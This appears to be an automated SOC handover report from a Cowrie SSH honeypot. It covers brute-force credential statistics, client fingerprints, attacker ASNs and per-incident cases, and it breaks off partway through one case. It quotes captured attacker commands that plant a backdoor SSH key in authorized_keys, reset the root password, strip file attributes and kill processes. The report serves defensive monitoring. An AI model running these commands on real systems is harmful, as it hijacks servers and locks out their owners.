# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-13 |
| **Generated At** | 2026-04-13T06:13:53Z |
| **Shift Time** | 06:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **311** |
| Confirmed Threats | **306** |
| False Positives Filtered | **5** (1.6%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **16** |
| High Severity Cases | **117** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **194** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **234** |
| Unique Credential Pairs | **72** |
| Unique Usernames | **28** |
| Unique Passwords | **70** |
| Successful Auth Pairs | **81** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 117 |
| `345gs5662d34` | 54 |
| `ubuntu` | 8 |
| `test` | 5 |
| `postgres` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 54 |
| `3245gs5662d34` | 54 |
| `Qazwsx123@` | 4 |
| `test` | 4 |
| `ubuntu.12345` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 54 |
| `root` | `3245gs5662d34` | 54 |
| `root` | `Qazwsx123@` | 4 |
| `ubuntu` | `ubuntu.12345` | 3 |
| `oracle` | `oracle02` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `linux@2026` | `193.39.208.26` | 2026-04-13T04:14:38 |
| `root` | `3245gs5662d34` | `193.39.208.26` | 2026-04-13T04:14:42 |
| `root` | `Qazwsx123@` | `209.141.47.217` | 2026-04-13T04:14:57 |
| `root` | `3245gs5662d34` | `209.141.47.217` | 2026-04-13T04:15:02 |
| `root` | `linux@2026` | `192.99.169.99` | 2026-04-13T04:18:45 |
| `root` | `3245gs5662d34` | `192.99.169.99` | 2026-04-13T04:18:51 |
| `root` | `Q!w2e3r4t5y6` | `43.128.76.85` | 2026-04-13T04:20:42 |
| `root` | `3245gs5662d34` | `43.128.76.85` | 2026-04-13T04:20:44 |
| `root` | `!@#123QWE` | `222.71.116.214` | 2026-04-13T04:20:56 |
| `root` | `Vps@123!` | `189.217.130.86` | 2026-04-13T04:22:19 |
| `root` | `3245gs5662d34` | `189.217.130.86` | 2026-04-13T04:22:26 |
| `root` | `QQdd111` | `43.128.76.85` | 2026-04-13T04:22:29 |
| `root` | `Qazwsx123@` | `93.48.24.181` | 2026-04-13T04:22:41 |
| `root` | `3245gs5662d34` | `93.48.24.181` | 2026-04-13T04:22:48 |
| `root` | `101101` | `189.217.130.86` | 2026-04-13T04:23:47 |
| `root` | `p@ck3tf3nc3` | `43.128.76.85` | 2026-04-13T04:25:55 |
| `root` | `QQdd111` | `93.48.24.181` | 2026-04-13T04:26:04 |
| `root` | `p@ck3tf3nc3` | `93.48.24.181` | 2026-04-13T04:27:45 |
| `root` | `Aini1314` | `93.48.24.181` | 2026-04-13T04:30:16 |
| `root` | `Root0000!` | `189.217.130.86` | 2026-04-13T04:31:20 |
| `root` | `Abcd1234$` | `14.103.105.243` | 2026-04-13T04:31:53 |
| `root` | `a123456sd` | `93.48.24.181` | 2026-04-13T04:31:56 |
| `root` | `3245gs5662d34` | `14.103.105.243` | 2026-04-13T04:32:04 |
| `root` | `Aini1314` | `43.128.76.85` | 2026-04-13T04:32:34 |
| `root` | `Q!w2e3r4t5y6` | `93.48.24.181` | 2026-04-13T04:32:47 |
| `root` | `admin1234567$` | `93.48.24.181` | 2026-04-13T04:33:38 |
| `root` | `Qazwsx123123!@` | `14.103.105.243` | 2026-04-13T04:34:09 |
| `root` | `Vps@123!` | `43.128.76.85` | 2026-04-13T04:34:17 |
| `root` | `a123456sd` | `43.128.76.85` | 2026-04-13T04:35:58 |
| `root` | `Aini1314` | `189.217.130.86` | 2026-04-13T04:36:08 |
| `root` | `Vps@123!` | `93.48.24.181` | 2026-04-13T04:37:03 |
| `root` | `12345` | `43.128.76.85` | 2026-04-13T04:37:41 |
| `root` | `101101` | `93.48.24.181` | 2026-04-13T04:37:53 |
| `root` | `12345` | `189.217.130.86` | 2026-04-13T04:39:12 |
| `root` | `Root0000!` | `93.48.24.181` | 2026-04-13T04:39:35 |
| `root` | `Pa$$w0rd@2025` | `14.103.105.243` | 2026-04-13T04:39:52 |
| `root` | `admin1234567$` | `189.217.130.86` | 2026-04-13T04:40:49 |
| `root` | `admin1234567$` | `43.128.76.85` | 2026-04-13T04:41:11 |
| `root` | `Qazwsx123@` | `43.128.76.85` | 2026-04-13T04:42:50 |
| `root` | `ZAQ!2wsx2021@123` | `14.103.105.243` | 2026-04-13T04:43:21 |
| `root` | `Qazwsx123@` | `189.217.130.86` | 2026-04-13T04:46:54 |
| `root` | `Root0000!` | `43.128.76.85` | 2026-04-13T04:47:50 |
| `root` | `QQdd111` | `189.217.130.86` | 2026-04-13T04:48:25 |
| `root` | `p@ck3tf3nc3` | `189.217.130.86` | 2026-04-13T04:49:59 |
| `root` | `101101` | `43.128.76.85` | 2026-04-13T04:51:07 |
| `root` | `Q!w2e3r4t5y6` | `189.217.130.86` | 2026-04-13T04:51:38 |
| `root` | `a123456sd` | `189.217.130.86` | 2026-04-13T04:54:49 |
| `root` | `123789` | `120.52.12.202` | 2026-04-13T05:54:44 |
| `root` | `3245gs5662d34` | `120.52.12.202` | 2026-04-13T05:54:54 |
| `root` | `Qwerty654321` | `102.213.34.99` | 2026-04-13T05:55:52 |
| `root` | `3245gs5662d34` | `102.213.34.99` | 2026-04-13T05:55:59 |
| `root` | `ABcd1234` | `118.193.34.157` | 2026-04-13T05:58:20 |
| `root` | `3245gs5662d34` | `118.193.34.157` | 2026-04-13T05:58:23 |
| `root` | `Admin!123` | `135.181.107.145` | 2026-04-13T05:58:49 |
| `root` | `3245gs5662d34` | `135.181.107.145` | 2026-04-13T05:58:53 |
| `root` | `smoothwall` | `14.103.112.107` | 2026-04-13T06:00:53 |
| `root` | `Admin123!!!` | `14.103.117.142` | 2026-04-13T06:01:07 |
| `root` | `3245gs5662d34` | `14.103.117.142` | 2026-04-13T06:01:16 |
| `root` | `showmethemoney` | `112.216.108.62` | 2026-04-13T06:03:34 |
| `root` | `3245gs5662d34` | `112.216.108.62` | 2026-04-13T06:03:37 |
| `root` | `Abcd123456789.` | `103.123.53.88` | 2026-04-13T06:03:38 |
| `root` | `3245gs5662d34` | `103.123.53.88` | 2026-04-13T06:03:40 |
| `root` | `Qwe#123` | `177.70.6.158` | 2026-04-13T06:04:30 |
| `root` | `3245gs5662d34` | `177.70.6.158` | 2026-04-13T06:04:38 |
| `root` | `Root@12345` | `103.123.53.88` | 2026-04-13T06:05:15 |
| `root` | `Root01` | `103.123.53.88` | 2026-04-13T06:06:57 |
| `root` | `ZAQ!2wsx54321!@` | `112.216.108.62` | 2026-04-13T06:07:02 |
| `root` | `ZAQ!2wsx54321!@` | `177.70.6.158` | 2026-04-13T06:08:11 |
| `root` | `qazwsx888..` | `112.216.108.62` | 2026-04-13T06:09:05 |
| `root` | `Root1111111!@#` | `125.21.53.232` | 2026-04-13T06:09:24 |
| `root` | `3245gs5662d34` | `125.21.53.232` | 2026-04-13T06:09:25 |
| `root` | `Aa123456+` | `152.32.163.183` | 2026-04-13T06:10:25 |
| `root` | `aaaqqq` | `103.123.53.88` | 2026-04-13T06:10:28 |
| `root` | `a123456@` | `58.229.141.26` | 2026-04-13T06:10:44 |
| `root` | `asd123456` | `112.216.108.62` | 2026-04-13T06:10:46 |
| `root` | `3245gs5662d34` | `58.229.141.26` | 2026-04-13T06:10:47 |
| `root` | `Asdf@1234` | `102.88.137.145` | 2026-04-13T06:11:19 |
| `root` | `3245gs5662d34` | `102.88.137.145` | 2026-04-13T06:11:26 |
| `root` | `Qazwsx1!@` | `103.123.53.88` | 2026-04-13T06:12:09 |
| `root` | `123456@qwer` | `112.216.108.62` | 2026-04-13T06:12:23 |
| `root` | `secret` | `14.103.46.177` | 2026-04-13T06:12:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **311** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 302 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 290 | 27 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 290 | 27 | Modern SSH client |
| `95420f9d932d...` | libssh | 12 | 6 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 5 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 54 | 18 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ludEaiwlXYyL"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `93.48.24.181`, `222.71.116.214`, `14.103.112.107`, `152.32.163.183`, `14.103.105.243`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:gonYhc2RqIRH"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.46.177`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `93.48.24.181`, `209.141.47.217`, `118.193.34.157`, `103.123.53.88`, `135.181.107.145`, `177.70.6.158`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **27** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 8 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS215540` | GLOBAL CONNECTIVITY SOLUTIONS LLP | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS4812` | China Telecom (Group) | 1 | HIGH |
| `AS28548` | Cablevisión, S.A. de C.V. | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (117)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-138da5c100d1

| Field | Detail |
|---|---|
| **Source IP** | `193.39.208[.]26` |
| **First Seen** | 2026-04-13 04:14 |
| **Last Seen** | 2026-04-13 04:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:14:37` | `cowrie.session.connect` |
| `2026-04-13 04:14:37` | `cowrie.client.version` |
| `2026-04-13 04:14:38` | `cowrie.client.kex` |
| `2026-04-13 04:14:38` | `cowrie.login.success` |
| `2026-04-13 04:14:38` | `cowrie.session.params` |
| `2026-04-13 04:14:38` | `cowrie.command.input` |
| `2026-04-13 04:14:38` | `cowrie.command.failed` |
| `2026-04-13 04:14:39` | `cowrie.log.closed` |
| `2026-04-13 04:14:39` | `cowrie.session.params` |
| `2026-04-13 04:14:39` | `cowrie.command.input` |
| `2026-04-13 04:14:39` | `cowrie.session.file_download` |
| `2026-04-13 04:14:39` | `cowrie.log.closed` |
| `2026-04-13 04:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.39.208[.]26` to AbuseIPDB if not already reported
- [ ] Block `193.39.208[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f5dd41cc98f

| Field | Detail |
|---|---|
| **Source IP** | `193.39.208[.]26` |
| **First Seen** | 2026-04-13 04:14 |
| **Last Seen** | 2026-04-13 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:14:41` | `cowrie.session.connect` |
| `2026-04-13 04:14:41` | `cowrie.client.version` |
| `2026-04-13 04:14:41` | `cowrie.client.kex` |
| `2026-04-13 04:14:42` | `cowrie.login.success` |
| `2026-04-13 04:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.39.208[.]26` to AbuseIPDB if not already reported
- [ ] Block `193.39.208[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c7c167b287

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-13 04:14 |
| **Last Seen** | 2026-04-13 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:14:55` | `cowrie.session.connect` |
| `2026-04-13 04:14:55` | `cowrie.client.version` |
| `2026-04-13 04:14:56` | `cowrie.client.kex` |
| `2026-04-13 04:14:57` | `cowrie.login.success` |
| `2026-04-13 04:14:57` | `cowrie.session.params` |
| `2026-04-13 04:14:57` | `cowrie.command.input` |
| `2026-04-13 04:14:57` | `cowrie.command.failed` |
| `2026-04-13 04:14:57` | `cowrie.log.closed` |
| `2026-04-13 04:14:58` | `cowrie.session.params` |
| `2026-04-13 04:14:58` | `cowrie.command.input` |
| `2026-04-13 04:14:58` | `cowrie.session.file_download` |
| `2026-04-13 04:14:58` | `cowrie.log.closed` |
| `2026-04-13 04:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600af05070f2

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-13 04:15 |
| **Last Seen** | 2026-04-13 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:15:01` | `cowrie.session.connect` |
| `2026-04-13 04:15:01` | `cowrie.client.version` |
| `2026-04-13 04:15:01` | `cowrie.client.kex` |
| `2026-04-13 04:15:02` | `cowrie.login.success` |
| `2026-04-13 04:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bfbb9aaf167

| Field | Detail |
|---|---|
| **Source IP** | `192.99.169[.]99` |
| **First Seen** | 2026-04-13 04:18 |
| **Last Seen** | 2026-04-13 04:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:18:44` | `cowrie.session.connect` |
| `2026-04-13 04:18:44` | `cowrie.client.version` |
| `2026-04-13 04:18:44` | `cowrie.client.kex` |
| `2026-04-13 04:18:45` | `cowrie.login.success` |
| `2026-04-13 04:18:46` | `cowrie.session.params` |
| `2026-04-13 04:18:46` | `cowrie.command.input` |
| `2026-04-13 04:18:46` | `cowrie.command.failed` |
| `2026-04-13 04:18:46` | `cowrie.log.closed` |
| `2026-04-13 04:18:47` | `cowrie.session.params` |
| `2026-04-13 04:18:47` | `cowrie.command.input` |
| `2026-04-13 04:18:47` | `cowrie.session.file_download` |
| `2026-04-13 04:18:47` | `cowrie.log.closed` |
| `2026-04-13 04:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.99.169[.]99` to AbuseIPDB if not already reported
- [ ] Block `192.99.169[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b354b8296844

| Field | Detail |
|---|---|
| **Source IP** | `192.99.169[.]99` |
| **First Seen** | 2026-04-13 04:18 |
| **Last Seen** | 2026-04-13 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:18:50` | `cowrie.session.connect` |
| `2026-04-13 04:18:50` | `cowrie.client.version` |
| `2026-04-13 04:18:50` | `cowrie.client.kex` |
| `2026-04-13 04:18:51` | `cowrie.login.success` |
| `2026-04-13 04:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.99.169[.]99` to AbuseIPDB if not already reported
- [ ] Block `192.99.169[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d2f3b753455

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:20 |
| **Last Seen** | 2026-04-13 04:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:20:41` | `cowrie.session.connect` |
| `2026-04-13 04:20:41` | `cowrie.client.version` |
| `2026-04-13 04:20:41` | `cowrie.client.kex` |
| `2026-04-13 04:20:42` | `cowrie.login.success` |
| `2026-04-13 04:20:42` | `cowrie.session.params` |
| `2026-04-13 04:20:42` | `cowrie.command.input` |
| `2026-04-13 04:20:42` | `cowrie.command.failed` |
| `2026-04-13 04:20:42` | `cowrie.log.closed` |
| `2026-04-13 04:20:42` | `cowrie.session.params` |
| `2026-04-13 04:20:42` | `cowrie.command.input` |
| `2026-04-13 04:20:42` | `cowrie.session.file_download` |
| `2026-04-13 04:20:42` | `cowrie.log.closed` |
| `2026-04-13 04:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b97ed901abd6

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:20 |
| **Last Seen** | 2026-04-13 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:20:44` | `cowrie.session.connect` |
| `2026-04-13 04:20:44` | `cowrie.client.version` |
| `2026-04-13 04:20:44` | `cowrie.client.kex` |
| `2026-04-13 04:20:44` | `cowrie.login.success` |
| `2026-04-13 04:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8dc5eafb6d6

| Field | Detail |
|---|---|
| **Source IP** | `222.71.116[.]214` |
| **First Seen** | 2026-04-13 04:20 |
| **Last Seen** | 2026-04-13 04:21 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
